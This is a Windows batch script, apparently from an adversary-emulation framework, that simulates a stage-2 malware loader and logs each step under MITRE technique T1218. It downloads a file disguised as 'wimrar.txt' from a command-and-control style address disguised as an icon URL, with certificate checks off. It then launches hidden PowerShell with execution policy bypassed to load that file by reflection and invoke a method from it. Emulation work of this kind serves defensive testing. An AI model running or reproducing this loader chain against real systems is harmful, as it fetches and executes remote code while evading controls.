@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random variable names)
SET x1=%APPDATA%\10797\7f228250
SET x2=wimrar.txt
SET x3=https://10.0.0.49/stage/2/icon.png?10797-7
SET x4=ITZEL-S2B
SET x5=10797
SET x6=7
SET x7=%PUBLIC%\\macula-simulations.log

REM Derived aliases for readability
SET outputdir=!x1!
SET outputfile=!x2!
SET heartbeat=!x3!
SET agentname=!x4!
SET simid=!x5!
SET logfile=!x7!

REM Cache timestamp at script start
SET tsvar=!DATE!/!TIME!

REM ------------------------------------------------------------
REM Phase: Download Stage 2 Loader DLL from C2 via heartbeat
REM ------------------------------------------------------------
echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o "!outputdir!\!outputfile!" "!heartbeat!"
set download_ec=!errorlevel!
if !download_ec! equ 0 (
    echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_complete>> "!logfile!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_fail=!download_ec!>> "!logfile!" 2>nul
)

REM ------------------------------------------------------------
REM Phase: Change working directory to output directory
REM ------------------------------------------------------------
echo [!tsvar!][DEBUG][!agentname!][!simid!]: chdir_start>> "!logfile!" 2>nul
cd /d "!outputdir!" >nul 2>&1
set cd_ec=!errorlevel!
if !cd_ec! equ 0 (
    echo [!tsvar!][DEBUG][!agentname!][!simid!]: chdir_result=0>> "!logfile!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!agentname!][!simid!]: chdir_result=!cd_ec!>> "!logfile!" 2>nul
)

REM ------------------------------------------------------------
REM Phase: Invoke Stage 2 .NET Loader DLL via PowerShell reflection (LOLBIN)
REM ------------------------------------------------------------
echo [!tsvar!][DEBUG][!agentname!][!simid!]: pshell_start>> "!logfile!" 2>nul
powershell.exe -nop -w hidden -ep bypass -Command "& { $a=[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('%APPDATA%\10797\7f228250\wimrar.txt')); ($a.GetExportedTypes()|%{$_.GetMethods([Reflection.BindingFlags]'Public,Static')|?{$_.GetParameters().Count -eq 0}}|Select -First 1).Invoke($null,$null) }"
set pshell_ec=!errorlevel!
if !pshell_ec! equ 0 (
    set resultvar=OK
    set errdetail=
) else (
    set resultvar=FAIL
    set errdetail=PS_Exit_!pshell_ec!
)
echo [!tsvar!][DEBUG][!agentname!][!simid!]: pshell_result=!pshell_ec!>> "!logfile!" 2>nul

REM ------------------------------------------------------------
REM Phase: Log TTP outcome to log file
REM ------------------------------------------------------------
echo [!tsvar!][TTP][!agentname!][!simid!]: T1218|System Binary Proxy Execution=!resultvar!:!errdetail!>> "!logfile!" 2>nul

REM Exit cleanly
exit /b 0